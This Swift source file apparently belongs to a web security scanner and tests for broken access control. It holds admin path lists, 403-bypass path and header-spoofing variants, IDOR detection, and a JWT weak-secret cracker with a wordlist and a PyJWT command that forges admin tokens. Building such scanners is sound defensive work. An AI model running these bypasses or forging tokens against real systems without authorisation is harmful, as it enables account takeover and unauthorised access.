import Foundation
import CryptoKit

enum AccessControl {

    static func candidatePaths(max: Int) -> [String] {
        let paths = [
            "admin", "admin/", "administrator/", "admin/dashboard", "admin/index.php",
            "dashboard", "manage", "management", "console", "backend", "backoffice",
            "wp-admin/", "user/admin", "cms", "controlpanel", "adminpanel",
            "api/admin", "api/v1/admin", "api/users", "api/v1/users", "api/user",
            "api/account", "api/accounts", "api/internal", "api/private", "api/config",
            "actuator", "actuator/env", "actuator/health", "actuator/mappings",
            "metrics", "internal", "private", "debug", "config", "settings",
            "server-status", "phpmyadmin/", "adminer.php", "graphql",
            "users", "accounts", "orders", "reports", "audit", "logs",
        ]
        return Array(paths.prefix(max))
    }

    static func looksSensitive(_ text: String) -> Bool {
        let l = text.lowercased()
        let strong = [
            "admin panel", "admin dashboard", "control panel", "site administration",
            "user management", "manage users", "system settings", "admin area",
            "moderator", "wp-admin", "phpmyadmin", "actuator", "server status",
            "dashboard</", ">dashboard<", "log out", "logout", "sign out",
            "\"activeprofiles\"", "propertysources", "prometheus", "# help",
        ]
        return strong.contains { l.contains($0) }
    }

    static func looksLikeLogin(_ text: String) -> Bool {
        let l = text.lowercased()
        return l.contains("type=\"password\"") || l.contains("type='password'")
            || l.contains("type=password") || l.contains("name=\"password\"")
            || l.contains("j_password") || l.contains("please log in")
            || l.contains("please sign in") || l.contains("login-form")
            || l.contains("sign in to continue")
    }

    struct BypassVariant {
        let label: String

        let url: String

        let headers: [String: String]
    }

    static func bypassVariants(for path: String, origin: String,
                               includeExtendedHeaders: Bool) -> [BypassVariant] {
        let p = path.hasPrefix("/") ? String(path.dropFirst()) : path
        let normal = "\(origin)/\(p)"
        var out: [BypassVariant] = []

        func pathVariant(_ label: String, _ url: String) {
            out.append(BypassVariant(label: label, url: url, headers: [:]))
        }
        pathVariant("double leading slash (//)", "\(origin)//\(p)")
        pathVariant("/./ segment", "\(origin)/./\(p)")
        pathVariant("trailing /.", "\(origin)/\(p)/.")
        pathVariant("trailing %20 (space)", "\(normal)%20")
        pathVariant("trailing %09 (tab)", "\(normal)%09")
        pathVariant("trailing %2f", "\(normal)%2f")
        pathVariant("%2e/ prefix", "\(origin)/%2e/\(p)")
        pathVariant("matrix param ;/", "\(normal);/")
        if !p.hasSuffix("/") { pathVariant("trailing slash", "\(normal)/") }
        let upper = p.uppercased()
        if upper != p { pathVariant("uppercase path", "\(origin)/\(upper)") }

        out.append(BypassVariant(label: "X-Original-URL header", url: "\(origin)/",
                                 headers: ["X-Original-URL": "/\(p)"]))
        out.append(BypassVariant(label: "X-Rewrite-URL header", url: "\(origin)/",
                                 headers: ["X-Rewrite-URL": "/\(p)"]))
        out.append(BypassVariant(label: "X-Forwarded-For: 127.0.0.1", url: normal,
                                 headers: ["X-Forwarded-For": "127.0.0.1"]))
        out.append(BypassVariant(label: "X-Custom-IP-Authorization: 127.0.0.1", url: normal,
                                 headers: ["X-Custom-IP-Authorization": "127.0.0.1"]))
        out.append(BypassVariant(label: "Referer trust", url: normal,
                                 headers: ["Referer": normal]))

        if includeExtendedHeaders {
            out.append(BypassVariant(label: "X-Forwarded-Host: 127.0.0.1", url: normal,
                                     headers: ["X-Forwarded-Host": "127.0.0.1"]))
            out.append(BypassVariant(label: "X-Originating-IP: 127.0.0.1", url: normal,
                                     headers: ["X-Originating-IP": "127.0.0.1"]))
            out.append(BypassVariant(label: "X-Remote-Addr: 127.0.0.1", url: normal,
                                     headers: ["X-Remote-Addr": "127.0.0.1"]))
            out.append(BypassVariant(label: "X-Client-IP: 127.0.0.1", url: normal,
                                     headers: ["X-Client-IP": "127.0.0.1"]))
        }
        return out
    }

    static func missingAuthFinding(path: String, response: HTTPResponse) -> Finding {
        Finding(
            title: "Unauthenticated access to protected area: /\(path)",
            severity: .high,
            category: "Broken Access Control",
            location: response.finalURL.absoluteString,
            detail: "A request to /\(path) returned an admin/management surface (HTTP \(response.status)) with no login or authorization challenge.",
            evidence: "URL: \(response.finalURL.absoluteString)\nHTTP \(response.status), \(response.body.count) bytes\nPreview: \(snippet(response.text, max: 180))",
            exploit: "The endpoint exposes privileged functionality to anyone. An attacker reaches admin/management features directly, with no credentials - reading data or performing actions meant for staff only.",
            remediation: "Require authentication and authorization on every privileged route (deny-by-default). Enforce the check server-side on the endpoint itself, not just by hiding links in the UI.",
            reference: "CWE-306: Missing Authentication for Critical Function")
    }

    static func bypassFinding(path: String, technique: String,
                              response: HTTPResponse, confident: Bool) -> Finding {
        let headerTrick = technique.contains("Original-URL") || technique.contains("Rewrite-URL")
        let severity: Severity = confident ? (headerTrick ? .critical : .high) : .medium
        let confidenceNote = confident
            ? "The bypassed response contains admin/management content, confirming the protected resource was reached."
            : "The bypassed response returned substantially more content than the 403/401 - likely the protected resource. Verify manually."
        return Finding(
            title: "Access-control bypass on /\(path) via \(technique)",
            severity: severity,
            category: "Broken Access Control",
            location: response.finalURL.absoluteString,
            detail: "A normal request to /\(path) is blocked (401/403), but the \"\(technique)\" variant returned HTTP \(response.status). \(confidenceNote)",
            evidence: "Working request: \(response.finalURL.absoluteString)\nTechnique: \(technique)\nHTTP \(response.status), \(response.body.count) bytes\nPreview: \(snippet(response.text, max: 180))",
            exploit: "The access-control rule is enforced only at one layer (e.g. the front proxy or a path prefix). Rewriting the path or spoofing a trusted header slips past it and reaches the protected resource - an attacker gets the access the block was meant to prevent.",
            remediation: "Enforce authorization in the application on the canonical, normalized path - not in a reverse-proxy path rule. Collapse //, /./, trailing dots/spaces, and %2e/%2f before matching. Never trust client-supplied headers (X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Custom-IP-Authorization) for access decisions.",
            reference: "CWE-284 / CWE-290: Authentication Bypass by Spoofing")
    }

    static func idorCandidates(in urls: [URL]) -> [(url: String, ref: String)] {
        let keyRe = try? NSRegularExpression(
            pattern: "^(id|uid|uuid|guid|user|users|userid|account|acct|customer|order|orderid|invoice|doc|document|file|fileid|pid|item|record|profile|no|num|number|key|ref)$",
            options: [.caseInsensitive])
        let numRe = try? NSRegularExpression(pattern: "^[0-9]{1,12}$", options: [])
        let uuidRe = try? NSRegularExpression(
            pattern: "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
            options: [.caseInsensitive])
        let segRe = try? NSRegularExpression(
            pattern: "/(users?|accounts?|orders?|invoices?|customers?|documents?|files?|profiles?|records?|items?)/([0-9]{1,12})(?:/|$)",
            options: [.caseInsensitive])

        func matches(_ re: NSRegularExpression?, _ s: String) -> Bool {
            guard let re else { return false }
            return re.firstMatch(in: s, range: NSRange(s.startIndex..., in: s)) != nil
        }

        var out: [(url: String, ref: String)] = []
        var seen = Set<String>()
        for u in urls {

            if let comps = URLComponents(url: u, resolvingAgainstBaseURL: false),
               let items = comps.queryItems {
                for it in items {
                    guard let v = it.value, matches(keyRe, it.name),
                          matches(numRe, v) || matches(uuidRe, v) else { continue }
                    let ref = "\(it.name)=\(v)"
                    let key = "\(u.path)?\(it.name)"
                    if seen.insert(key).inserted { out.append((u.absoluteString, ref)) }
                }
            }

            if let re = segRe {
                let ns = u.path as NSString
                for m in re.matches(in: u.path, range: NSRange(location: 0, length: ns.length))
                where m.numberOfRanges > 2 {
                    let ref = ns.substring(with: m.range)
                    let key = "seg:" + ns.substring(with: m.range(at: 1)).lowercased()
                    if seen.insert(key).inserted { out.append((u.absoluteString, ref.trimmingCharacters(in: CharacterSet(charactersIn: "/")))) }
                }
            }
            if out.count >= 40 { break }
        }
        return out
    }

    static func idorFinding(_ candidates: [(url: String, ref: String)]) -> Finding {
        let examples = candidates.prefix(8)
            .map { "\($0.ref)  →  \($0.url)" }
            .joined(separator: "\n")
        return Finding(
            title: "Possible insecure direct object references (IDOR)",
            severity: .low,
            category: "Broken Access Control",
            location: candidates.first?.url ?? "",
            detail: "\(candidates.count) URL(s) reference objects by a guessable identifier (numeric ID or UUID). If the server does not verify that the current user owns each object, changing the identifier returns someone else's data.",
            evidence: "Object-reference parameters found:\n\(examples)",
            exploit: "An attacker changes the identifier (e.g. ?id=123 → ?id=124, or /users/1 → /users/2) to read or modify records belonging to other users - a classic IDOR / broken object-level authorization flaw.",
            remediation: "Enforce per-object authorization on every request (verify the object belongs to the authenticated user's tenant/account). Prefer unguessable identifiers (UUIDs) as defense-in-depth, but never rely on them alone.",
            reference: "CWE-639: Authorization Bypass Through User-Controlled Key")
    }

    static func extractJWTs(_ text: String) -> [String] {
        guard let re = try? NSRegularExpression(
            pattern: "eyJ[A-Za-z0-9_-]{8,}\\.[A-Za-z0-9_-]{8,}\\.[A-Za-z0-9_-]{0,}",
            options: []) else { return [] }
        let ns = text as NSString
        var out: [String] = []
        var seen = Set<String>()
        for m in re.matches(in: text, range: NSRange(location: 0, length: ns.length)) {
            let tok = ns.substring(with: m.range)
            if seen.insert(tok).inserted { out.append(tok) }
            if out.count >= 30 { break }
        }
        return out
    }

    private static func base64urlDecode(_ s: String) -> Data? {
        var t = s.replacingOccurrences(of: "-", with: "+")
                 .replacingOccurrences(of: "_", with: "/")
        while t.count % 4 != 0 { t += "=" }
        return Data(base64Encoded: t)
    }

    private static func jsonObject(_ part: String) -> [String: Any]? {
        guard let data = base64urlDecode(part),
              let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else { return nil }
        return obj
    }

    static let jwtWeakSecrets: [String] = [
        "", "secret", "secretkey", "secret_key", "secret-key", "secretKey",
        "jwtsecret", "jwt_secret", "jwt-secret", "jwtSecret", "jwtRefreshSecret",
        "mysecret", "my_secret", "my-secret", "my_secret_key", "mySecretKey",
        "supersecret", "super_secret", "superSecret", "topsecret", "verysecret",
        "password", "passw0rd", "p@ssw0rd", "pass", "passwd",
        "123456", "1234567890", "12345678", "qwerty", "letmein", "admin", "root",
        "changeme", "change_me", "change-me", "default", "test", "testing",
        "key", "privatekey", "private_key", "private", "public",
        "token", "accesstoken", "access_token", "refreshtoken", "refresh_token",
        "your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
        "your_jwt_secret", "your-secret-key", "your_secret_key", "yoursecret",
        "s3cr3t", "s3cret", "s3cr3tk3y", "shhhhh", "shhh", "hunter2",
        "HS256", "hmac", "hmacsecret", "signingkey", "signing_key", "signature",
        "app_secret", "appsecret", "api_secret", "apisecret", "client_secret",
        "sessionsecret", "session_secret", "cookiesecret", "cookie_secret",
        "dev", "development", "staging", "prod", "production", "local",
        "example", "example_key", "demo", "sample", "foo", "bar", "foobar",
        "qwertyuiop", "asdfghjkl", "zxcvbnm", "iloveyou", "welcome", "master",
        "node", "express", "django-insecure", "insecure", "nestjs",
    ]

    private static func base64urlSignature(_ part: String) -> Data? {
        var t = part.replacingOccurrences(of: "-", with: "+")
                    .replacingOccurrences(of: "_", with: "/")
        while t.count % 4 != 0 { t += "=" }
        return Data(base64Encoded: t)
    }

    private static func hmacMatches(alg: String, signingInput: Data, signature: Data, secret: String) -> Bool {
        let key = SymmetricKey(data: Data(secret.utf8))
        switch alg {
        case "hs256": return Data(HMAC<SHA256>.authenticationCode(for: signingInput, using: key)) == signature
        case "hs384": return Data(HMAC<SHA384>.authenticationCode(for: signingInput, using: key)) == signature
        case "hs512": return Data(HMAC<SHA512>.authenticationCode(for: signingInput, using: key)) == signature
        default:      return false
        }
    }

    static func crackJWTSecret(token: String) -> String? {
        let parts = token.split(separator: ".", omittingEmptySubsequences: false).map(String.init)
        guard parts.count == 3,
              let header = jsonObject(parts[0]),
              let alg = (header["alg"] as? String)?.lowercased(),
              alg == "hs256" || alg == "hs384" || alg == "hs512",
              let signature = base64urlSignature(parts[2]), !signature.isEmpty else { return nil }
        let signingInput = Data((parts[0] + "." + parts[1]).utf8)
        for secret in jwtWeakSecrets where hmacMatches(alg: alg, signingInput: signingInput, signature: signature, secret: secret) {
            return secret
        }
        return nil
    }

    static func jwtFindings(token: String, source: String) -> [Finding] {
        let parts = token.split(separator: ".", omittingEmptySubsequences: false).map(String.init)
        guard parts.count >= 2,
              let header = jsonObject(parts[0]),
              let payload = jsonObject(parts[1]) else { return [] }

        var issues: [String] = []
        var worst: Severity = .info

        let alg = (header["alg"] as? String)?.lowercased() ?? ""
        if alg == "none" || alg.isEmpty {
            issues.append("• alg is \"\(header["alg"] as? String ?? "missing")\": the signature is not verified, so anyone can forge a token with any claims (e.g. role=admin).")
            worst = min(worst, .critical)
        }

        let crackedSecret = (parts.count == 3 && alg.hasPrefix("hs")) ? crackJWTSecret(token: token) : nil
        if let secret = crackedSecret {
            let shown = secret.isEmpty ? "(empty string)" : "\"\(SecretScanner.revealSecrets ? secret : redact(secret))\""
            issues.append("• The HMAC signing secret is weak and was recovered by the scanner: \(shown). With the key known, an attacker signs their own tokens with any claims - identical to alg:none.")
            worst = min(worst, .critical)
        }

        if payload["exp"] == nil {
            issues.append("• No \"exp\" claim: the token never expires, so a single leak grants permanent access.")
            worst = min(worst, .medium)
        } else if let exp = (payload["exp"] as? Double) ?? (payload["exp"] as? Int).map(Double.init) {
            let days = (exp - Date().timeIntervalSince1970) / 86_400
            if days > 30 {
                issues.append("• Very long expiry (~\(Int(days)) days): widens the window of a leaked token.")
                worst = min(worst, .low)
            }
        }

        let privKeys: Set<String> = ["role", "roles", "is_admin", "isadmin", "admin",
                                     "scope", "scopes", "permissions", "authorities",
                                     "groups", "is_staff", "superuser", "tier", "plan"]
        var lowerPayload: [String: Any] = [:]
        for (k, v) in payload { lowerPayload[k.lowercased()] = v }
        let present = privKeys.filter { lowerPayload[$0] != nil }.sorted()
        if !present.isEmpty {
            let shown = present.prefix(6)
                .map { "\($0)=\(lowerPayload[$0].map { "\($0)" } ?? "?")" }
                .joined(separator: ", ")
            issues.append("• Privilege claims in the token: \(shown). If the server does not re-verify the signature, tampering these escalates privileges.")
            if worst == .info { worst = .low }
        }

        guard !issues.isEmpty else { return [] }

        let display = SecretScanner.revealSecrets ? token : redact(token)
        let title: String
        if crackedSecret != nil {
            title = "Forgeable JWT: weak signing secret recovered"
        } else {
            switch worst {
            case .critical: title = "Forgeable JWT (alg:none) exposed"
            case .medium:   title = "JWT weakness: no expiry"
            default:        title = "JWT weakness enabling privilege escalation"
            }
        }

        var reproduction: String? = nil
        if let secret = crackedSecret {
            let algName = alg.isEmpty ? "HS256" : alg.uppercased()
            let keyForPoC = SecretScanner.revealSecrets ? secret : "<recovered-secret>"
            reproduction = "# Signing secret recovered: \(secret.isEmpty ? "(empty string)" : "\"\(SecretScanner.revealSecrets ? secret : redact(secret))\"")\n"
                + "# Forge a token with any claims you like (requires PyJWT):\n"
                + "python3 -c 'import jwt; print(jwt.encode({\"sub\":\"victim\",\"role\":\"admin\"}, \"\(keyForPoC)\", algorithm=\"\(algName)\"))'"
        }

        return [Finding(
            title: title,
            severity: worst,
            category: "Broken Access Control",
            location: source,
            detail: "A JSON Web Token exposed to the client has weaknesses that can enable authentication bypass or privilege escalation:\n\(issues.joined(separator: "\n"))",
            evidence: "Source: \(source)\nToken: \(display)\nHeader: \(snippet(String(describing: header), max: 140))\nClaims: \(snippet(String(describing: payload), max: 200))",
            exploit: "Tokens are the identity in a session. If the signature is not enforced (alg:none), the signing secret is guessable, or claims are trusted without verification, an attacker mints or edits a token to impersonate other users or grant themselves admin - full account/privilege takeover.",
            remediation: "Reject alg:none and pin the expected algorithm server-side; sign with a long, random, high-entropy secret (32+ bytes) or an asymmetric key, and always verify the signature before trusting any claim. Set a short exp. Rotate the signing key immediately if it was recovered here.",
            reference: "CWE-347: Improper Verification of Cryptographic Signature",
            reproduction: reproduction)]
    }
}
